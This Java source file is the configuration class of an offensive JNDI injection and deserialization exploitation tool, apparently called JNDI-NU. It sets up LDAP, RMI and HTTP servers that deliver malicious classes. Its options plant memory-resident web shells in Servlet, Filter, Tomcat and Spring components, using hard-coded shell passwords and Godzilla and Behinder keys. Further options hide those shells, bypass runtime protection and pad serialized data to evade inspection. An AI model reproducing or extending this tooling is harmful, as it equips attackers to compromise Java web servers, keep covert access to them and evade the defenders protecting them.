package com.qi4l.jndi.gadgets.Config;

import com.beust.jcommander.JCommander;
import com.beust.jcommander.Parameter;
import com.beust.jcommander.UnixStyleUsageFormatter;
import com.qi4l.jndi.Starter;
import com.qi4l.jndi.gadgets.ObjectPayload;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Strings;
import javassist.ClassPool;

import java.util.*;

public class Config {
    public static String codeBase;

    @Parameter(names = {"-i", " --ip"}, description = "Local ip address ", order = 1)
    public static String ip = "0.0.0.0";

    @Parameter(names = {"-lP", "--ldapPort"}, description = "Ldap bind port", order = 2)
    public static int ldapPort = 1389;

    @Parameter(names = {"-rP", "--rmiPort"}, description = "rmi bind port", order = 2)
    public static int rmiPort = 1099;

    @Parameter(names = {"-hP", "--httpPort"}, description = "Http bind port", order = 3)
    public static int httpPort = 3456;

    @Parameter(names = {"-he", " --help"}, help = true, description = "Show this help")
    private static boolean help = false;

    @Parameter(names = {"-c", " --command"}, help = true, description = "RMI this command")
    public static String command = "whoami";

    @Parameter(names = {"-v", " --version"}, description = "Show version", order = 5)
    public static boolean showVersion;

    @Parameter(names = {"-ga", " --gadgets"}, description = "Show gadgets", order = 5)
    public static boolean showGadgets;

    @Parameter(names = {"-ak", " --AESkey"}, description = "AES+BAse64 decryption of routes", order = 5)
    public static String AESkey = "123";

    @Parameter(names = {"-u", " --user"}, description = "ldap bound account", order = 5)
    public static String USER = "";

    @Parameter(names = {"-p", " --PASSWD"}, description = "ldap binding password", order = 5)
    public static String PASSWD = "";

    @Parameter(names = {"--jndi"}, description = "Show gadgets", order = 5)
    public static boolean jndi = false;

    public static String rhost;
    public static String rport;

    public static void applyCmdArgs(String[] args) {
        //process cmd args
        JCommander jc = JCommander.newBuilder()
                .addObject(new Config())
                .build();
        try {
            jc.parse(args);
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage() + "\n");
            help = true;
        }

        if (showGadgets) {
            final List<Class<? extends ObjectPayload>> payloadClasses =
                    new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
            Collections.sort(payloadClasses, new Strings.ToStringComparator()); // alphabetize

            final List<String[]> rows = new LinkedList<String[]>();
            rows.add(new String[]{"Payload", "Authors", "Dependencies"});
            rows.add(new String[]{"-------", "-------", "------------"});
            for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
                rows.add(new String[]{
                        payloadClass.getSimpleName(),
                        Strings.join(Arrays.asList(Authors.Utils.getAuthors(payloadClass)), ", ", "@", ""),
                        Strings.join(Arrays.asList(Dependencies.Utils.getDependenciesSimple(payloadClass)), ", ", "", "")
                });
            }

            final List<String> lines = Strings.formatTable(rows);

            for (String line : lines) {
                System.out.println("     " + line);
            }

            System.exit(0);
        }

        if (showVersion) {
            System.out.println("" +
                    "     ██╗███╗   ██╗██████╗ ██╗███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗\n" +
                    "     ██║████╗  ██║██╔══██╗██║██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝\n" +
                    "     ██║██╔██╗ ██║██║  ██║██║█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   \n" +
                    "██   ██║██║╚██╗██║██║  ██║██║██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   \n" +
                    "╚█████╔╝██║ ╚████║██████╔╝██║███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   \n" +
                    " ╚════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   \n" +
                    "                                                                                  ");
            System.exit(0);
        }

        //获取当前 Jar 的名称
        String jarPath = Starter.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        jc.setProgramName("java -jar JNDI-NU.jar");
        jc.setUsageFormatter(new UnixStyleUsageFormatter(jc));

        if (help) {
            jc.usage(); //if -h specified, show help and exit
            System.exit(0);
        }

        // 特别注意：最后一个反斜杠不能少啊
        Config.codeBase = "http://" + Config.ip + ":" + Config.httpPort + "/";
    }

    // 从HTTP外部获取路由值
    public static String ROUTE = "";

    // 从HTTP外部获取参数值
    public static String BCEL1 = "";

    // 恶意类是否继承 AbstractTranslet
    public static Boolean IS_INHERIT_ABSTRACT_TRANSLET = false;

    //是否使用反射绕过RASP
    public static Boolean IS_OBSCURE = false;

    // 各种方式的内存马映射的路径
    public static String URL_PATTERN = "/nu1r";

    // 是否使用落地文件的方式隐藏内存马
    public static Boolean HIDE_MEMORY_SHELL = false;

    // 是否生成内存马文件
    public static Boolean GEN_MEM_SHELL = false;

    // 内存马文件名
    public static String GEN_MEM_SHELL_FILENAME = "";

    // 落地文件姿势，1 charsets.jar 2 classes
    public static int HIDE_MEMORY_SHELL_TYPE = 0;

    // 内存马的密码
    public static String PASSWORD = "0f359740bd1cda99";

    // Referer 校验
    public static String HEADER_KEY = "https://nu1r.cn/";

    // 用于额外校验的 Http Header 值，默认值 https://nu1r.cn/
    public static String HEADER_VALUE = "https://nu1r.cn/";

    // 哥斯拉的 key，默认是 key
    public static String GODZILLA_KEY = "3c6e0b8a9c15224a";

    // 密码原文
    public static String PASSWORD_ORI = "p@ssw0rd";

    // 命令执行回显时，传递执行命令的 Header 头
    public static String CMD_HEADER_STRING = "X-Token-Data";

    //内存马的类型
    public static String Shell_Type = "bx";

    //是否使用windows下Agent写入
    public static Boolean winAgent = false;

    //是否使用Linux下Agent写入
    public static Boolean linAgent = false;


    // 是否在序列化数据流中的 TC_RESET 中填充脏数据
    public static Boolean IS_DIRTY_IN_TC_RESET = false;

    // 填充的脏数据长度
    public static int DIRTY_LENGTH_IN_TC_RESET = 0;

    // jboss
    public static Boolean IS_JBOSS_OBJECT_INPUT_STREAM = false;

    // DefineClassFromParameter 的路径
    public static String PARAMETER = "dc";

    // 将输入直接写在文件里
    public static String FILE = "out.ser";

    public static Boolean WRITE_FILE = false;

    // 是否强制使用 org.apache.XXX.TemplatesImpl
    public static Boolean FORCE_USING_ORG_APACHE_TEMPLATESIMPL = false;

    // 在 Transformer[] 中使用 org.mozilla.javascript.DefiningClassLoader
    public static Boolean USING_MOZILLA_DEFININGCLASSLOADER = false;

    // ScriptEngineManager 是否为 RHINO 引擎
    public static boolean USING_RHINO = false;

    public static ClassPool POOL = ClassPool.getDefault();

    // 不同类型内存马的父类/接口与其关键参数的映射
    public static HashMap<String, String> KEY_METHOD_MAP = new HashMap<>();


    public static void init() {
        // Servlet 型内存马，关键方法 service
        KEY_METHOD_MAP.put("javax.servlet.Servlet", "service");
        // Filter 型内存马，关键方法 doFilter
        KEY_METHOD_MAP.put("javax.servlet.Filter", "doFilter");
        // Listener 型内存马，通常使用 ServletRequestListener， 关键方法 requestInitializedHandle
        KEY_METHOD_MAP.put("javax.servlet.ServletRequestListener", "requestInitializedHandle");
        // Websocket 型内存马，关键方法 onMessage
        KEY_METHOD_MAP.put("javax.websocket.MessageHandler$Whole", "onMessage");
        // Tomcat Upgrade 型内存马，关键方法 accept
        KEY_METHOD_MAP.put("org.apache.coyote.UpgradeProtocol", "accept");
        // Tomcat Executor 型内存马，关键方法 execute
        KEY_METHOD_MAP.put("org.apache.tomcat.util.threads.ThreadPoolExecutor", "execute");
        // Spring Interceptor 型内存马，关键方法 preHandle
        KEY_METHOD_MAP.put("org.springframework.web.servlet.handler.HandlerInterceptorAdapter", "preHandle");
    }

    static {
        // Servlet 型内存马，关键方法 service
        KEY_METHOD_MAP.put("javax.servlet.Servlet", "service");
        // Filter 型内存马，关键方法 doFilter
        KEY_METHOD_MAP.put("javax.servlet.Filter", "doFilter");
        // Listener 型内存马，通常使用 ServletRequestListener， 关键方法 requestInitializedHandle
        KEY_METHOD_MAP.put("javax.servlet.ServletRequestListener", "requestInitializedHandle");
        // Websocket 型内存马，关键方法 onMessage
        KEY_METHOD_MAP.put("javax.websocket.MessageHandler$Whole", "onMessage");
        // Tomcat Upgrade 型内存马，关键方法 accept
        KEY_METHOD_MAP.put("org.apache.coyote.UpgradeProtocol", "accept");
        // Tomcat Executor 型内存马，关键方法 execute
        KEY_METHOD_MAP.put("org.apache.tomcat.util.threads.ThreadPoolExecutor", "execute");
        // Spring Interceptor 型内存马，关键方法 preHandle
        KEY_METHOD_MAP.put("org.springframework.web.servlet.handler.HandlerInterceptorAdapter", "preHandle");
        // Webflux 内存马
        KEY_METHOD_MAP.put("org.springframework.web.server.WebFilter", "executePayload");
    }
}
